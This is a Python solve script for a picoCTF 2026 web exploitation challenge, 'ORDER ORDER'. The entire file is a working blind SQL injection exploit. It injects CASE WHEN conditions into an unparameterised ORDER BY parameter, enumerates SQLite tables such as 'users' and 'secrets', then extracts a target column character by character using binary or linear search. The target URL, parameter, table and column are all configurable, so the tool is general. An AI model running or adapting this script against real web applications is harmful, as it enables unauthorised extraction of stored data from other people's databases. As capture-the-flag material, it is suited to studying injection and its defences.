#!/usr/bin/env python3
"""
ORDER ORDER - picoCTF 2026
Category: Web Exploitation (300 pts)

Blind SQL Injection via ORDER BY clause using CASE WHEN boolean conditions.
The developer parameterized all queries except the ORDER BY clause,
which cannot use standard prepared-statement placeholders for column names.

Usage:
    python3 solve.py [--url URL]
"""

import requests
import argparse
import string
import sys
import urllib.parse


def parse_args():
    parser = argparse.ArgumentParser(description="ORDER ORDER - Blind SQLi via ORDER BY")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://challenge.picoctf.org:PORT)")
    parser.add_argument("--path", default="/", help="Path to the vulnerable endpoint (default: /)")
    parser.add_argument("--param", default="order", help="Vulnerable query parameter name (default: order)")
    parser.add_argument("--table", default="flag", help="Table containing the flag (default: flag)")
    parser.add_argument("--column", default="flag", help="Column containing the flag (default: flag)")
    parser.add_argument("--true-col", default="name", help="Column to sort by when condition is TRUE (default: name)")
    parser.add_argument("--false-col", default="id", help="Column to sort by when condition is FALSE (default: id)")
    parser.add_argument("--max-len", type=int, default=100, help="Max flag length to try (default: 100)")
    parser.add_argument("--method", choices=["binary", "linear"], default="binary",
                        help="Extraction method: binary search or linear scan (default: binary)")
    return parser.parse_args()


def build_payload_bool(condition, true_col, false_col):
    """Build a CASE WHEN payload for the ORDER BY clause."""
    return f"CASE WHEN ({condition}) THEN {true_col} ELSE {false_col} END"


def send_request(session, url, path, param, payload):
    """Send a request with the injection payload and return the response text."""
    target = f"{url.rstrip('/')}{path}"
    params = {param: payload}
    try:
        resp = session.get(target, params=params, timeout=10)
        return resp.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}", file=sys.stderr)
        return None


def check_condition(session, url, path, param, condition, true_col, false_col, true_response=None):
    """
    Check if a SQL condition is true by comparing the response
    to the known 'true' response (sorted by true_col).
    """
    payload = build_payload_bool(condition, true_col, false_col)
    response = send_request(session, url, path, param, payload)
    if response is None:
        return False

    if true_response is None:
        return response
    return response == true_response


def calibrate(session, url, path, param, true_col, false_col):
    """
    Get baseline responses for TRUE and FALSE conditions
    to distinguish between the two sort orders.
    """
    print("[*] Calibrating true/false responses...")

    true_payload = build_payload_bool("1=1", true_col, false_col)
    true_resp = send_request(session, url, path, param, true_payload)

    false_payload = build_payload_bool("1=2", true_col, false_col)
    false_resp = send_request(session, url, path, param, false_payload)

    if true_resp == false_resp:
        print("[!] WARNING: True and false responses are identical!")
        print("[!] The injection may not be working, or you may need to adjust --true-col / --false-col.")
        print("[!] Try using column names that produce visibly different sort orders.")
        sys.exit(1)

    print("[+] Calibration successful - true and false responses differ.")
    return true_resp


def find_flag_length(session, url, path, param, table, column, true_col, false_col, true_resp, max_len):
    """Determine the length of the flag using binary search."""
    print("[*] Determining flag length...")
    low, high = 1, max_len

    while low < high:
        mid = (low + high) // 2
        condition = f"SELECT length({column}) FROM {table})<={mid}"
        # Corrected condition with proper parentheses
        condition = f"(SELECT length({column}) FROM {table})<={mid}"
        result = check_condition(session, url, path, param, condition, true_col, false_col, true_resp)
        if result:
            high = mid
        else:
            low = mid + 1

    # Verify the length
    condition = f"(SELECT length({column}) FROM {table})={low}"
    if check_condition(session, url, path, param, condition, true_col, false_col, true_resp):
        print(f"[+] Flag length: {low}")
        return low

    print("[!] Could not determine flag length reliably.")
    return max_len


def extract_flag_binary(session, url, path, param, table, column, true_col, false_col, true_resp, flag_len):
    """Extract the flag character-by-character using binary search on ASCII values."""
    print(f"[*] Extracting flag using binary search ({flag_len} characters)...")
    flag = ""

    for i in range(1, flag_len + 1):
        low, high = 32, 126  # Printable ASCII range

        while low < high:
            mid = (low + high) // 2
            condition = f"(SELECT unicode(substr({column},{i},1)) FROM {table})<={mid}"
            result = check_condition(session, url, path, param, condition, true_col, false_col, true_resp)
            if result:
                high = mid
            else:
                low = mid + 1

        flag += chr(low)
        sys.stdout.write(f"\r[+] Flag so far: {flag}")
        sys.stdout.flush()

        # Early termination if we see the closing brace
        if flag.endswith("}"):
            print()
            return flag

    print()
    return flag


def extract_flag_linear(session, url, path, param, table, column, true_col, false_col, true_resp, flag_len):
    """Extract the flag character-by-character using linear character scan."""
    print(f"[*] Extracting flag using linear scan ({flag_len} characters)...")
    charset = string.printable.strip()
    flag = ""

    for i in range(1, flag_len + 1):
        found = False
        for c in charset:
            # Escape single quotes in the character
            escaped_c = c.replace("'", "''")
            condition = f"(SELECT substr({column},{i},1) FROM {table})='{escaped_c}'"
            result = check_condition(session, url, path, param, condition, true_col, false_col, true_resp)
            if result:
                flag += c
                sys.stdout.write(f"\r[+] Flag so far: {flag}")
                sys.stdout.flush()
                found = True
                break

        if not found:
            flag += "?"
            sys.stdout.write(f"\r[+] Flag so far: {flag}")
            sys.stdout.flush()

        # Early termination if we see the closing brace
        if flag.endswith("}"):
            print()
            return flag

    print()
    return flag


def discover_tables(session, url, path, param, true_col, false_col, true_resp):
    """Try to discover interesting table names (SQLite-specific)."""
    print("[*] Attempting to discover tables...")
    common_tables = ["flag", "flags", "secret", "secrets", "users", "admin", "hidden"]

    found_tables = []
    for table_name in common_tables:
        condition = f"(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='{table_name}')>0"
        result = check_condition(session, url, path, param, condition, true_col, false_col, true_resp)
        if result:
            print(f"[+] Found table: {table_name}")
            found_tables.append(table_name)

    return found_tables


def main():
    args = parse_args()
    session = requests.Session()

    print("=" * 60)
    print("  ORDER ORDER - Blind SQLi via ORDER BY Clause")
    print("  picoCTF 2026 - Web Exploitation (300 pts)")
    print("=" * 60)
    print(f"[*] Target: {args.url}")
    print(f"[*] Parameter: {args.param}")
    print()

    # Step 1: Calibrate true/false detection
    true_resp = calibrate(session, args.url, args.path, args.param,
                          args.true_col, args.false_col)

    # Step 2: Discover tables (optional)
    tables = discover_tables(session, args.url, args.path, args.param,
                             args.true_col, args.false_col, true_resp)
    if tables:
        if args.table not in tables:
            print(f"[*] Specified table '{args.table}' not found, using first discovered: {tables[0]}")
            args.table = tables[0]
    else:
        print(f"[*] No common tables found via sqlite_master; proceeding with '{args.table}'")

    # Step 3: Find flag length
    flag_len = find_flag_length(session, args.url, args.path, args.param,
                                args.table, args.column,
                                args.true_col, args.false_col, true_resp, args.max_len)

    # Step 4: Extract the flag
    if args.method == "binary":
        flag = extract_flag_binary(session, args.url, args.path, args.param,
                                   args.table, args.column,
                                   args.true_col, args.false_col, true_resp, flag_len)
    else:
        flag = extract_flag_linear(session, args.url, args.path, args.param,
                                   args.table, args.column,
                                   args.true_col, args.false_col, true_resp, flag_len)

    print()
    print("=" * 60)
    print(f"[+] FLAG: {flag}")
    print("=" * 60)


if __name__ == "__main__":
    main()
